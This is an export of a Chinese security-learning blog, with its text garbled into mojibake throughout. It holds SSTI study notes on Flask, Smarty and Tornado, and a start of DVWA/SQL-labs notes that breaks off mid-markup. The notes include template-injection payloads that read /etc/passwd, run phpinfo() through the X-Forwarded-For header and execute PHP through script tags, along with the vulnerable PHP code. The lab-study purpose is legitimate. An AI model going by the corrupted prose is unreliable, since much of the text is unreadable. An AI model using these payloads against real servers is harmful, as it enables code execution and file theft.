<p><u><strong>æ³¨ï¼Œç”±äº è½¬ä¹‰å†…å®¹ Hexoä½¿ç”¨Nunjucksæ¸²æŸ“å¸–å­ï¼ˆè¾ƒæ—©çš„ç‰ˆæœ¬ä½¿ç”¨Swigï¼Œå®ƒä»¬å…·æœ‰ç›¸ä¼¼çš„è¯­æ³•ï¼‰ã€‚ç”¨<code>&#123; &#123; &#125; &#125;</code>æˆ–<code>&#123; ï¼… ï¼… &#125;</code>åŒ…è£…çš„å†…å®¹å°†è¢«è§£æï¼Œå¹¶å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åŸå§‹æ ‡ç­¾æ’ä»¶åŒ…è£…æ•æ„Ÿå†…å®¹ã€‚</strong></u></p>
<p><u><strong>è¿™é‡Œæ˜¯æŠŠæ‰€æœ‰{  {}  }å’Œ {  %% }ï¼Œæ²¡æœ‰ç©ºæ ¼ï¼Œæ›¿æ¢æˆæœ‰ç©ºæ ¼çš„ï¼Œæ‰èƒ½ä¸Šä¼ åšå®¢</strong></u></p>
<h4 id="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"><a href="#å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š" class="headerlink" title="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"></a>å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š</h4><h5 id="SSTIçš„ç†è§£ï¼š"><a href="#SSTIçš„ç†è§£ï¼š" class="headerlink" title="SSTIçš„ç†è§£ï¼š"></a>SSTIçš„ç†è§£ï¼š</h5><p>SSTIå’ŒSQLæ³¨å…¥åŸç†å·®ä¸å¤šï¼Œéƒ½æ˜¯å› ä¸ºå¯¹è¾“å…¥çš„å­—ç¬¦ä¸²æ§åˆ¶ä¸è¶³ï¼ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å½“æˆå‘½ä»¤æ‰§è¡Œã€‚</p>
<h5 id="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"><a href="#SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š" class="headerlink" title="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"></a>SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š</h5><p>render_templateæ¸²æŸ“å‡½æ•°çš„é—®é¢˜</p>
<h5 id="render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"><a href="#render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š" class="headerlink" title="render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"></a>render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š</h5><p>å°±æ˜¯æŠŠHTMLæ¶‰åŠçš„é¡µé¢ä¸ç”¨æˆ·æ•°æ®åˆ†ç¦»å¼€ï¼Œè¿™æ ·æ–¹ä¾¿å±•ç¤ºå’Œç®¡ç†ã€‚å½“ç”¨æˆ·è¾“å…¥è‡ªå·±çš„æ•°æ®ä¿¡æ¯ï¼ŒHTMLé¡µé¢å¯ä»¥æ ¹æ®ç”¨æˆ·è‡ªèº«çš„ä¿¡æ¯æ¥å±•ç¤ºé¡µé¢ï¼Œå› æ­¤æ‰æœ‰äº†è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ã€‚</p>
<h5 id="render-templateï¼š"><a href="#render-templateï¼š" class="headerlink" title="render_templateï¼š"></a>render_templateï¼š</h5><p>æ¸²æŸ“å‡½æ•°åœ¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå¾€å¾€å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä¸åšæ¸²æŸ“ï¼Œ<br>å³ï¼š{  {}  }åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{  {}  }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{  {1+1}  }ä¼šè¢«è§£ææˆ2ã€‚å› æ­¤æ‰æœ‰äº†ç°åœ¨çš„æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚å¾€å¾€å˜é‡æˆ‘ä»¬ä½¿ç”¨{  {è¿™é‡Œæ˜¯å†…å®¹}  }<br>çœŸå› ä¸º{  {}  }åŒ…è£¹çš„ä¸œè¥¿ä¼šè¢«è§£æï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥å®ç°ç±»ä¼¼äºSQLæ³¨å…¥çš„æ¼æ´<br>æ³¨å…¥çš„æ€æƒ³ï¼š</p>
<p>ç”¨å‡½æ•°ä¸æ–­è°ƒç”¨æˆ‘ä»¬è¦ä½¿ç”¨çš„å‘½ä»¤å¦‚ï¼šfileã€readã€openã€lsç­‰ç­‰å‘½ä»¤ï¼Œæˆ‘ä»¬ç”¨è¿™äº›æ¥è¯»å–å†™å…¥é…ç½®æ–‡ä»¶ï¼›</p>
<h4 id="Smarty-SSTIåˆ©ç”¨"><a href="#Smarty-SSTIåˆ©ç”¨" class="headerlink" title="Smarty SSTIåˆ©ç”¨"></a>Smarty SSTIåˆ©ç”¨</h4><p>Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p>
<h5 id="æ¼æ´ç¡®è®¤"><a href="#æ¼æ´ç¡®è®¤" class="headerlink" title="æ¼æ´ç¡®è®¤"></a>æ¼æ´ç¡®è®¤</h5><p>ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30</p>
<h5 id="å¸¸è§„åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§„åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§„åˆ©ç”¨æ–¹å¼"></a>å¸¸è§„åˆ©ç”¨æ–¹å¼</h5><h6 id="php-php-æ ‡ç­¾"><a href="#php-php-æ ‡ç­¾" class="headerlink" title="{php}{/php}æ ‡ç­¾"></a>{php}{/php}æ ‡ç­¾</h6><p>Smartyæ”¯æŒä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å°±è¯¥é¢˜ç›®è€Œè¨€ï¼Œä½¿ç”¨{php}{/php}æ ‡ç­¾ä¼šæŠ¥é”™ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p>
<p>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Smarty</span>å·²ç»åºŸå¼ƒ&#123;php&#125;æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty <span class="number">3</span>.<span class="number">1</span>ï¼Œ&#123;php&#125;ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</span><br></pre></td></tr></table></figure></div>

<p>è¯¥é¢˜ç›®ä½¿ç”¨çš„æ˜¯Smartyç±»ï¼Œæ‰€ä»¥åªèƒ½å¦å¯»å®ƒè·¯ã€‚</p>
<h6 id="literal-æ ‡ç­¾"><a href="#literal-æ ‡ç­¾" class="headerlink" title="{literal} æ ‡ç­¾"></a>{literal} æ ‡ç­¾</h6><p>å®˜æ–¹æ‰‹å†Œè¿™æ ·æè¿°è¿™ä¸ªæ ‡ç­¾ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;literal&#125;</span><span class="language-xml">å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</span></span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆå¯¹äºphp5çš„ç¯å¢ƒæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æ¥å®ç°PHPä»£ç çš„æ‰§è¡Œï¼Œä½†è¿™é“é¢˜çš„é¢˜ç›®ç¯å¢ƒæ˜¯PHP7ï¼Œè¿™ç§æ–¹æ³•å°±å¤±æ•ˆäº†ã€‚</p>
<h5 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h5><p>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚</p>
<p>Smartyç±»çš„getStreamVariableæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selfæ¥è·å–Smartyå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¾ˆå¤šæ–‡ç« é‡Œç»™çš„payloadéƒ½å½¢å¦‚ï¼š{self::getStreamVariable(â€œfile:///etc/passwdâ€)}ã€‚ç„¶è€Œä½¿ç”¨è¿™ä¸ªpayloadä¼šè§¦å‘æŠ¥é”™å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(â€˜file:///etc/passwdâ€™)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  is undefined or not allowed by security setting &lt;-- thrown in  <span class="regexp">/var/</span>www<span class="regexp">/html/</span>smarty<span class="regexp">/libs/</span>sysplugins/smarty_internal_templatecompilerbase.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>å¯è§è¿™ä¸ªæ—§ç‰ˆæœ¬Smartyçš„SSTIåˆ©ç”¨æ–¹å¼å¹¶ä¸é€‚ç”¨äºæ–°ç‰ˆæœ¬çš„Smartyã€‚è€Œä¸”åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ã€‚å¯¹äºé‚£äº›æ–‡ç« æåˆ°çš„åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shellä¹Ÿç”±äºåŒæ ·çš„åŸå› æ— æ³•ä½¿ç”¨ã€‚</p>
<h6 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h6><p>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">Smartyçš„</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„</span><span class="template-tag">&#123;/<span class="name">if</span>&#125;</span><span class="language-xml">. ä¹Ÿå¯ä»¥ä½¿ç”¨</span><span class="template-variable">&#123;else&#125;</span><span class="language-xml"> å’Œ </span><span class="template-variable">&#123;elseif&#125;</span><span class="language-xml">. </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œ</span></span><br><span class="line"><span class="language-xml">å¦‚*||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰</span></span><br></pre></td></tr></table></figure></div>

<p>æ—¢ç„¶å…¨éƒ¨çš„PHPå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿ</p>
<p>å°†XFFå¤´æ”¹ä¸º{if phpinfo()}{/if}ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®æ‰§è¡Œäº†phpinfo()</p>
<p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p>
<p>ç”¨åŒæ ·çš„æ–¹æ³•å¯ä»¥è½»æ¾è·å¾—flag</p>
<p>é¢˜ç›®æ¼æ´ä»£ç </p>
<p>é€šè¿‡getshellä¹‹åçš„æ–‡ä»¶è¯»å–ï¼Œæœ¬é¢˜ä¸­å¼•å‘SSTIçš„ä»£ç ç®€åŒ–åå¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨å­—ç¬¦ä¸²ä»£æ›¿smartyæ¨¡æ¿ï¼Œå¯¼è‡´äº†æ³¨å…¥çš„Smartyæ ‡ç­¾è¢«ç›´æ¥è§£ææ‰§è¡Œï¼Œäº§ç”Ÿäº†SSTIã€‚</p>
<h4 id="Tornado-SSTIåˆ©ç”¨"><a href="#Tornado-SSTIåˆ©ç”¨" class="headerlink" title="Tornado SSTIåˆ©ç”¨"></a>Tornado SSTIåˆ©ç”¨</h4><p><strong>tornadoæ˜¯ç”¨Pythonç¼–å†™çš„WebæœåŠ¡å™¨å…¼Webåº”ç”¨æ¡†æ¶</strong>ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¨¡æ¿çš„ä¸œè¥¿ã€‚å’ŒPythonç›¸å…³ï¼Œå’Œæ¨¡æ¿ç›¸å…³</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"> Tornadoæ¨¡æ¿æ”¯æŒæ§åˆ¶è¯­å¥å’Œè¡¨è¾¾å¼ã€‚</span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">æ§åˆ¶è¯­å¥è¢«</span><span class="template-tag">&#123;% %&#125;</span><span class="language-xml">, e.g. </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> len(items) &gt; 2 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">è¡¨è¾¾å¼è¢«</span><span class="template-variable">&#123;&#123; &#125;&#125;</span><span class="language-xml">, e.g. </span><span class="template-variable">&#123;&#123; items[0] &#125;&#125;</span><span class="language-xml">.</span></span><br></pre></td></tr></table></figure></div>

<p><strong>render()<strong>æ˜¯tornadoé‡Œçš„å‡½æ•°ï¼Œ</strong>å¯ä»¥ç”Ÿæˆhtmlæ¨¡æ¿ã€‚æ˜¯ä¸€ä¸ªæ¸²æŸ“å‡½æ•°</strong>ï¼Œå°±æ˜¯ä¸€ä¸ªå…¬å¼ï¼Œ<strong>èƒ½è¾“å‡ºå‰ç«¯é¡µé¢çš„å…¬å¼ã€‚</strong></p>
<p><strong>Tornado</strong>æ¡†æ¶çš„é™„å±æ–‡ä»¶<strong>handler.settings</strong>ä¸­å­˜åœ¨<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>è¿™ä¸ªå¯¹è±¡ï¼Œ<u>HandleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡</u></p>
<pre><code>RequestHandlerä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§

handler æŒ‡å‘RequestHandler

è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings

æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼
</code></pre>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>çº¿ä¸‹é¶åœºå­¦ä¹ </title>
    <url>/2022/06/21/underline-learning/</url>
    <content><![CDATA[<p><u><code>ä¸ºä»€ä¹ˆå­¦ä¹ çº¿ä¸‹é¶åœºï¼Œå› ä¸ºçº¿ä¸‹é¶åœºç›¸æ¯”æ›´åŠ å®¹æ˜“ç†è§£æ¼æ´å…¥é—¨ï¼Œ</code></u></p>
<p><u><code>è€Œä¸”å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„æºç ï¼Œä»è€Œå¯ä»¥é”»ç‚¼ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œæ‰¾å‡ºæ¼æ´çš„æˆå› ï¼Œ</code></u></p>
<p><u><code>å°è¯•è‡ªå·±æå‡ºç»•è¿‡æˆ–è€…é˜²å¾¡çš„æªæ–½ï¼Œè¿™é‡Œåªè®°å½•ä¸€ä¸‹æœ¬äººè§‰å¾—çš„çº¿ä¸‹é¶åœºå°è±¡æ·±åˆ»ï¼Œå¯¹æœ¬äººæœ‰æ„ä¹‰çš„éƒ¨åˆ†</code></u></p>
<span id="more"></span>

<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165390231016781818750292%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165390231016781818750292&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109705286-null-null.142%5Ev11%5Epc_search_result_control_group,157%5Ev12%5Econtrol&utm_term=dvwa&spm=1018.2226.3001.4187">æ¨èæ–‡ç« é“¾æ¥</a></p>
<p><em><u>ä¸è¦åªçŸ¥é“payloadï¼Œè¦ä»”ç»†åˆ†æç†è§£æºç ï¼Œæ‰¾å‡ºå‡ºç°æ¼æ´çš„åŸå› ç‚¹</u></em></p>
<p><u><code>å»ºè®®çœ‹æ¨èæ–‡ç« ï¼Œä¸‹é¢ä»£ç å®¡è®¡å’Œé¢˜ç›®åˆ†æä»…æ˜¯æˆ‘ä¸ªäººèƒ½åŠ›ç»“æœï¼Œåªèƒ½å°½å¯èƒ½è¯´åˆ°ç‚¹å¤„</code></u></p>
<p><u><code>è€Œä¸”éƒ¨åˆ†ä¹Ÿæ˜¯å€Ÿé‰´æ¨èæ–‡ç« å†…å®¹</code></u></p>
<h1 id="SQL-labs"><a href="#SQL-labs" class="headerlink" title="SQL-labs"></a>SQL-labs</h1><p><em><u>è¿™é‡Œä¸å…¨å†™ï¼Œè¯¦ç»†å»ºè®®æ‰¾ä¸€ä¸‹sql-labså¤©ä¹¦ï¼Œè®¤çœŸå­¦ä¹ ä¸€ä¸‹</u></em></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>å…¶å®æˆ‘ä»¬å¯ä»¥å…ˆåœ¨æºä»£ç ä¸­çœ‹åˆ°ä¸€ä¸ªå‡½æ•°ã€‚<code>check_input()</code>å‡½æ•°ã€‚ å°±ä¼šäº†è§£ä¸ºä»€ä¹ˆä¸åœ¨<code>username</code>å¤„è¿›è¡Œæ³¨å…¥</p>
<p><img src="/2022/06/21/underline-learning/image-20220729232132515.png" alt="image-20220729232132515"></p>
<p><img src="/2022/06/21/underline-learning/image-20220729232104117.png" alt="image-20220729232104117"></p>
<p>è¿™é‡ŒæŠŠè¿™å‡ ä¸ªå‡½æ•°è§£é‡Šä¸€ä¸‹ï¼Œå°±æ¸…æ¥šäº†</p>
<p><strong>â˜…addslashes()</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">addslashes<span class="comment">()</span> å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š </span><br><span class="line"></span><br><span class="line">â€‹å•å¼•å·ï¼ˆ<span class="string">&#x27;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åŒå¼•å·ï¼ˆ&quot;ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹åæ–œæ ï¼ˆ\ï¼‰ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€‹NULL </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æç¤ºï¼šè¯¥å‡½æ•°å¯ç”¨äºä¸ºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„å­—ç¬¦ä¸²ä»¥åŠæ•°æ®åº“æŸ¥è¯¢è¯­å¥å‡†å¤‡å­—ç¬¦ä¸²ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨é‡Šï¼šé»˜è®¤åœ°ï¼ŒPHP å¯¹æ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®è‡ªåŠ¨è¿è¡Œ addslashes()ã€‚æ‰€ä»¥æ‚¨ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸åº”å¯¹å·²è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨ addslashes()ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´åŒå±‚è½¬ä¹‰ã€‚é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä»¥ä½¿ç”¨å‡½æ•° get_magic_quotes_gpc() è¿›è¡Œæ£€æµ‹ã€‚ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">è¯­æ³•ï¼šaddslashes(<span class="built_in">string</span>) </span><br><span class="line"></span><br><span class="line">å‚æ•°             æè¿°</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span>          å¿…éœ€ã€‚è§„å®šè¦è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">è¿”å›å€¼ï¼š         è¿”å›å·²è½¬ä¹‰çš„å­—ç¬¦ä¸²ã€‚ </span><br><span class="line"></span><br><span class="line">PHP ç‰ˆæœ¬ï¼š       <span class="number">4</span>+ </span><br></pre></td></tr></table></figure></div>

<p><strong>â˜…stripslashes()</strong> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åˆ é™¤ç”± <span class="built_in">addslashes</span>() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚ </span><br></pre></td></tr></table></figure></div>

<p><strong>â˜…mysql_real_escape_string()</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">å‡½æ•°è½¬ä¹‰ <span class="keyword">SQL</span> è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚ </span><br></pre></td></tr></table></figure></div>

<p>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line"><span class="string">\x00</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\n</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\r</span> </span><br><span class="line"></span><br><span class="line"><span class="string">\</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot; </span></span><br><span class="line"><span 